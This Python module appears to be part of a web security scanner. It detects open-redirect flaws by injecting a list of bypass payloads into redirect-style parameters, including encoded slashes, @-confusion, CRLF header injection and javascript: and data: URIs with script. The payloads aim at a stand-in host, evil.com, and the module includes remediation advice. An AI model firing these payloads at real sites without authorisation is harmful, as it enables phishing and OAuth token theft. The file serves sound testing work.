"""Open Redirect Scanner — Deep unvalidated redirect detection.

Covers:
  - Standard redirect payloads (protocol-relative, scheme manipulation)
  - Encoding bypass (%2F%2F, tab, whitespace, backslash)
  - @ symbol host confusion
  - Subdomain confusion (target.com.evil.com)  
  - Meta-refresh and JavaScript redirect detection
  - data: and javascript: URI schemes
  - POST body redirect parameters
  - URL fragment and path-based redirects
  - WAF bypass variants
"""
from __future__ import annotations
import asyncio, re
from typing import List, Optional
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

# ── Redirect parameter names ─────────────────────────────────

REDIRECT_PARAMS = {
    "redirect", "redirect_uri", "redirect_url", "return", "return_url",
    "returnTo", "returnto", "next", "url", "rurl", "dest", "destination",
    "redir", "continue", "target", "view", "goto", "out", "link",
    "forward", "callback", "path", "to", "checkout_url", "login_url",
    "image_url", "success_url", "error_url", "cancel_url", "back",
    "back_url", "fallback", "service", "RelayState", "go", "jump",
    "u", "r", "ref", "site", "html", "load", "q",
}

# ── Redirect payloads ────────────────────────────────────────

REDIRECT_PAYLOADS = [
    # Standard
    ("https://evil.com", "absolute URL"),
    ("http://evil.com", "HTTP absolute"),
    # Protocol-relative
    ("//evil.com", "protocol-relative"),
    ("///evil.com", "triple slash"),
    ("////evil.com", "quad slash"),
    # Backslash bypass
    ("/\\evil.com", "backslash"),
    ("\\\\evil.com", "double backslash"),
    ("/\\/\\evil.com", "mixed slashes"),
    # Encoding bypass
    ("%2F%2Fevil.com", "URL-encoded //"),
    ("/%2F/evil.com", "partial encoded"),
    ("%2f%2fevil.com", "lowercase encoded"),
    ("//%2565vil.com", "double-encoded e"),
    # Tab/whitespace bypass
    ("/%09/evil.com", "tab bypass"),
    ("/ /evil.com", "space bypass"),
    ("/\t/evil.com", "raw tab"),
    # @ symbol confusion
    ("https://target.com@evil.com", "@ confusion"),
    ("https://evil.com%40target.com", "encoded @"),
    # Subdomain confusion
    ("https://target.com.evil.com", "subdomain spoof"),
    # Scheme manipulation
    ("https:evil.com", "missing //"),
    ("http:evil.com", "HTTP missing //"),
    ("https:///evil.com", "triple slash scheme"),
    # JavaScript protocol
    ("javascript:alert(1)", "javascript URI"),
    ("jAvAsCrIpT:alert(1)", "mixed case JS"),
    ("java%0d%0ascript:alert(1)", "CRLF in js"),
    ("javascript://%0aalert(1)", "JS comment bypass"),
    # data: URI
    ("data:text/html,<script>alert(1)</script>", "data URI"),
    ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "base64 data URI"),
    # Fragment-based
    ("//evil.com#", "fragment"),
    ("//evil.com?x=1", "query in payload"),
    # Null byte
    ("https://evil.com%00.target.com", "null byte"),
    # CRLF + redirect
    ("%0d%0aLocation:https://evil.com", "CRLF redirect"),
    # Path double encoding
    ("%252F%252Fevil.com", "double-encoded slashes"),
]

REMEDIATION = (
    "Validate redirect URLs against a whitelist of allowed domains. "
    "Use relative paths instead of absolute URLs for redirects. "
    "If external redirects are needed, use an intermediate confirmation page. "
    "Never rely on client-side validation alone. Reject all javascript: and data: URIs."
)


class OpenRedirectScanner(BaseScanner):
    name = "open_redirect"
    description = "Detects unvalidated redirect / open redirect with WAF bypass"
    tags = ["redirect", "owasp-a01"]

    async def run(self, state: ScanState) -> List[Finding]:
        tasks = []
        seen = set()

        for url, params in state.target.discovered_params.items():
            for param in params:
                if param.lower() in REDIRECT_PARAMS:
                    for payload, desc in REDIRECT_PAYLOADS:
                        tasks.append(self._test(url, param, payload, desc, "GET", "query"))
                    # POST body testing
                    for payload, desc in REDIRECT_PAYLOADS[:10]:
                        tasks.append(self._test(url, param, payload, desc, "POST", "body"))

        # Also check discovered URLs that look like redirects
        for url in state.target.discovered_urls[:50]:
            if any(kw in url.lower() for kw in ["redirect", "return", "next=", "goto", "redir", "callback"]):
                tasks.append(self._test_url(url))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        findings = []
        for r in results:
            if isinstance(r, Finding):
                key = (r.url, r.parameter, r.vuln_type)
                if key not in seen:
                    seen.add(key)
                    findings.append(r)
        return findings

    async def _test(self, url, param, payload, desc, method, inject_in) -> Optional[Finding]:
        # Test with no-redirect to see raw 3xx
        resp, raw_req = await self.test_payload_no_redirect(url, method, param, payload, inject_in=inject_in)
        if not resp:
            return None

        # Check 3xx redirect to evil.com
        if resp.status_code in (301, 302, 303, 307, 308):
            location = resp.headers.get("location", "")
            if "evil.com" in location:
                return self.make_finding(
                    title=f"Open Redirect ({desc}) via '{param}'",
                    vuln_type="open_redirect", severity=Severity.MEDIUM,
                    url=url, parameter=param, method=method, payload=payload,
                    evidence=f"Redirects to: {location}",
                    request=raw_req, response="",
                    cwe_id="CWE-601",
                    owasp_category="A01:2021 - Broken Access Control",
                    description=(
                        f"Parameter '{param}' ({method} {inject_in}) allows redirect "
                        f"to arbitrary external URLs. Bypass technique: {desc}."
                    ),
                    remediation=REMEDIATION,
                    poc_steps=[
                        f"1. {method} {url}",
                        f"2. Set {param}={payload} (in {inject_in})",
                        f"3. Server responds with redirect to {location}",
                        "4. Impact: phishing, OAuth token theft, credential harvesting",
                    ],
                )

        # Check for meta-refresh redirect
        resp_followed, raw_followed = await self.test_payload(url, method, param, payload, inject_in=inject_in)
        if resp_followed:
            body = resp_followed.text
            # Meta-refresh detection
            meta_match = re.search(
                r'<meta[^>]*http-equiv=["\']?refresh["\']?[^>]*content=["\']?\d+;\s*url=([^"\'>\s]+)',
                body, re.IGNORECASE
            )
            if meta_match and "evil.com" in meta_match.group(1):
                return self.make_finding(
                    title=f"Open Redirect (Meta-refresh) via '{param}'",
                    vuln_type="open_redirect_meta", severity=Severity.MEDIUM,
                    url=url, parameter=param, method=method, payload=payload,
                    evidence=f"Meta-refresh redirects to: {meta_match.group(1)}",
                    request=raw_followed, response=body[:300],
                    cwe_id="CWE-601",
                    owasp_category="A01:2021 - Broken Access Control",
                    remediation=REMEDIATION,
                )

            # JavaScript redirect detection
            js_redirect_patterns = [
                r'window\.location\s*=\s*["\']([^"\']+evil\.com[^"\']*)["\']',
                r'location\.href\s*=\s*["\']([^"\']+evil\.com[^"\']*)["\']',
                r'location\.replace\s*\(\s*["\']([^"\']+evil\.com[^"\']*)["\']',
                r'location\.assign\s*\(\s*["\']([^"\']+evil\.com[^"\']*)["\']',
            ]
            for pattern in js_redirect_patterns:
                js_match = re.search(pattern, body, re.IGNORECASE)
                if js_match:
                    return self.make_finding(
                        title=f"Open Redirect (JavaScript) via '{param}'",
                        vuln_type="open_redirect_js", severity=Severity.MEDIUM,
                        url=url, parameter=param, method=method, payload=payload,
                        evidence=f"JavaScript redirects to: {js_match.group(1)}",
                        request=raw_followed, response=body[:300],
                        cwe_id="CWE-601",
                        owasp_category="A01:2021 - Broken Access Control",
                        remediation=REMEDIATION,
                    )

            # Reflected payload near redirect context
            if payload in body and ("location" in body.lower() or "refresh" in body.lower()):
                return self.make_finding(
                    title=f"Open Redirect (Reflected) via '{param}'",
                    vuln_type="open_redirect_reflected", severity=Severity.LOW,
                    url=url, parameter=param, method=method, payload=payload,
                    evidence="Payload reflected near redirect context",
                    request=raw_req, response=body[:300],
                    cwe_id="CWE-601",
                    owasp_category="A01:2021 - Broken Access Control",
                    remediation=REMEDIATION,
                )

        return None

    async def _test_url(self, url) -> Optional[Finding]:
        """Test URLs that already contain redirect-like parameters."""
        resp, raw_req = await self.client.get_no_redirect(url)
        if resp and resp.status_code in (301, 302, 303, 307, 308):
            location = resp.headers.get("location", "")
            if any(domain in location for domain in ["evil.com", "attacker.com"]):
                return self.make_finding(
                    title="Open Redirect in discovered URL",
                    vuln_type="open_redirect", severity=Severity.MEDIUM,
                    url=url, evidence=f"Redirects to: {location}",
                    request=raw_req, cwe_id="CWE-601",
                    owasp_category="A01:2021 - Broken Access Control",
                    remediation=REMEDIATION,
                )
        return None
